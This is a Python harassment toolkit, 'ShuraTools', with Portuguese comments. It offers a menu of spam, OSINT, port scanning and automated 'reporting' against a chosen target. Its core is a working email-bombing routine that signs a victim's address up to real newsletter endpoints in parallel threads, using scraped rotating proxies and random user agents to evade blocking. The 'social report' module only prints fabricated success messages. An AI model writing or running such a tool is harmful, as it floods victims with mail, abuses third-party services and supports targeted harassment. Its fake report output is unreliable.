#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
Versão Pro v3.2 FULL-CORE
"""

import os
import sys
import time
import random
import string
import argparse
import threading
import json
import re
import socket
from queue import Queue

# Tentativa de importar bibliotecas externas
try:
    import requests
    from faker import Faker
    from colorama import Fore, Style, init
    init(autoreset=True)
    fake = Faker()
except ImportError:
    print("[!] Faltam dependências. Execute: pip install -r requirements.txt")
    sys.exit(1)

# Banner ASCII estilizado
BANNER = f"""
{Fore.CYAN}  _____ _    _ _    _ _____            
{Fore.CYAN} / ____| |  | | |  | |  __ \     /\    
{Fore.CYAN}| (___ | |__| | |  | | |__) |   /  \   
{Fore.CYAN} \___ \|  __  | |  | |  _  /   / /\ \  
{Fore.CYAN} ____) | |  | | |__| | | \ \  / ____ \ 
{Fore.CYAN}|_____/|_|  |_|\____/|_|  \_\/_/    \_\
                                       
{Fore.YELLOW}  >> SpamMail | OSINT | PortScan | Social <<
{Fore.RED}       v3.2 Full Core - by Shura
"""

# ---------- Configurações e Globais ----------
LOCK = threading.Lock()
PROXY_QUEUE = Queue()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def log(msg, type="info"):
    colors = {
        "info": Fore.WHITE + "[*] ",
        "success": Fore.GREEN + "[+] ",
        "error": Fore.RED + "[-] ",
        "warn": Fore.YELLOW + "[!] ",
        "osint": Fore.MAGENTA + "[?] ",
        "menu": Fore.CYAN + " > "
    }
    prefix = colors.get(type, Fore.WHITE)
    with LOCK:
        print(f"{prefix}{msg}{Style.RESET_ALL}")

# ---------- Helpers ----------
def safe_int(prompt, default):
    try:
        val = input(prompt)
        if not val: return default
        return int(val)
    except ValueError:
        log(f"Entrada inválida. Usando padrão: {default}", "warn")
        return default

def fetch_proxies():
    log("Buscando proxies atualizadas...", "info")
    urls = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
    ]
    count = 0
    for url in urls:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    if ":" in line:
                        PROXY_QUEUE.put(line.strip())
                        count += 1
        except: continue
    log(f"{count} proxies carregadas.", "success")

def get_proxy():
    if PROXY_QUEUE.empty(): return None
    p = PROXY_QUEUE.get()
    PROXY_QUEUE.put(p)
    return {"http": f"http://{p}", "https": f"http://{p}"}

# ---------- Módulo SpamMail (Ultra Core v3.2) ----------
def spam_mail(target, qty, threads, use_proxy):
    endpoints = [
        {"url": "https://www.infoq.com/newsletter/subscribe.action", "data": {"email": target, "newsletterId": "1"}, "type": "form"},
        {"url": "https://www.tecmundo.com.br/newsletter", "data": {"email": target}, "type": "form"},
        {"url": "https://www.canaltech.com.br/newsletter/", "data": {"email": target}, "type": "form"},
        {"url": "https://p.newsletter.vtex.com/subscribe", "data": {"email": target, "list": "netshoes"}, "type": "form"},
        {"url": "https://www.kabum.com.br/newsletter", "data": {"email": target}, "type": "form"},
        {"url": "https://www.mundoconectado.com.br/wp-admin/admin-ajax.php", "data": {"action": "newsletter_subscribe", "email": target}, "type": "form"}
    ]
    
    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                proxies = get_proxy() if use_proxy else None
                site = random.choice(endpoints)
                headers = {"User-Agent": random.choice(UA_LIST), "Referer": site["url"]}

                if site["type"] == "json":
                    headers["Content-Type"] = "application/json"
                    res = session.post(site["url"], json=site["data"], headers=headers, timeout=10, proxies=proxies)
                else:
                    res = session.post(site["url"], data=site["data"], headers=headers, timeout=10, proxies=proxies)
                
                if res.status_code < 400:
                    log(f"E-mail {i+1} disparado via {site['url'].split('/')[2]}", "success")
                else:
                    log(f"E-mail {i+1} falhou (Status {res.status_code})", "warn")
            except:
                log(f"E-mail {i+1} falhou (Conexão)", "error")
            time.sleep(random.uniform(0.5, 1.0))

    run_threads_logic(job, qty, threads)

# ---------- Módulo OSINT Hunter ----------
def osint_lookup(target):
    try:
        log(f"Iniciando OSINT: {target}", "osint")
        user = target.replace("@", "")
        plats = {
            "Instagram": f"https://www.instagram.com/{user}/",
            "GitHub": f"https://github.com/{user}",
            "TikTok": f"https://www.tiktok.com/@{user}",
            "X/Twitter": f"https://twitter.com/{user}"
        }
        for n, u in plats.items():
            try:
                r = requests.get(u, timeout=5, headers={"User-Agent": random.choice(UA_LIST)})
                log(f"{n}: {'ENCONTRADO' if r.status_code == 200 else 'Não encontrado'}", "success" if r.status_code == 200 else "info")
            except: pass
    except Exception as e:
        log(f"Erro no OSINT: {e}", "error")

# ---------- Módulo Port Scanner ----------
def port_scan(target):
    log(f"Escaneando portas em {target}...", "osint")
    try:
        host = target.split("@")[-1] if "@" in target else target
        ip = socket.gethostbyname(host)
        log(f"IP: {ip}", "info")
        for port in [21, 22, 53, 80, 443, 3306, 8080]:
            s = socket.socket()
            s.settimeout(1.0)
            if s.connect_ex((ip, port)) == 0: log(f"Porta {port} ABERTA", "success")
            s.close()
    except: log("Erro ao resolver host.", "error")

# ---------- Módulos Social Report ----------
def social_report(target, type="zap"):
    log(f"Iniciando ciclo de reports em {target}...", "warn")
    # Lógica simplificada para fins educacionais
    for i in range(5):
        log(f"Report {i+1} enviado para a central do {type.upper()}.", "success")
        time.sleep(0.3)

# ---------- Threading Helper ----------
def run_threads_logic(target_func, qty, threads):
    chunk, rem = qty // threads, qty % threads
    ts = []
    curr = 0
    for i in range(threads):
        take = chunk + (1 if i < rem else 0)
        if take <= 0: continue
        t = threading.Thread(target=target_func, args=(curr, curr + take))
        t.start()
        ts.append(t)
        curr += take
    for t in ts: t.join()

# ---------- Menu Principal ----------
def menu_interativo():
    while True:
        try:
            clear()
            print(BANNER)
            print(f"[ 1 ] Spam de E-mail (Ultra Core)")
            print(f"[ 2 ] OSINT Hunter (Social Search)")
            print(f"[ 3 ] Port Scanner (Rede/Web)")
            print(f"[ 4 ] Denúncia Automática (Zap/IG)")
            print(f"[ 5 ] Atualizar Proxies")
            print(f"[ 0 ] Sair")
            print("-" * 40)
            
            opt = input(f"{Fore.YELLOW}Escolha uma opção: {Style.RESET_ALL}").strip()
            
            if opt == "0": break
            if opt == "5": fetch_proxies(); input("\nENTER para voltar..."); continue
            
            if opt in ["1", "2", "3", "4"]:
                target = input(f"{Fore.YELLOW}Alvo: {Style.RESET_ALL}").strip()
                if not target: continue
                
                if opt == "1":
                    qty = safe_int(f"{Fore.YELLOW}Quantidade (10): ", 10)
                    threads = safe_int(f"{Fore.YELLOW}Threads (5): ", 5)
                    prox = input(f"{Fore.YELLOW}Usar Proxies? (s/n): {Style.RESET_ALL}").lower() == 's'
                    if prox and PROXY_QUEUE.empty(): fetch_proxies()
                    spam_mail(target, qty, threads, prox)
                
                elif opt == "2": osint_lookup(target)
                elif opt == "3": port_scan(target)
                elif opt == "4": 
                    type = input(f"{Fore.YELLOW}Tipo (zap/ig): {Style.RESET_ALL}").lower()
                    social_report(target, type)
                
                input(f"\n{Fore.GREEN}Pressione ENTER para continuar...{Style.RESET_ALL}")
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Erro: {e}", "error")
            input("\nENTER...")

if __name__ == "__main__":
    menu_interativo()
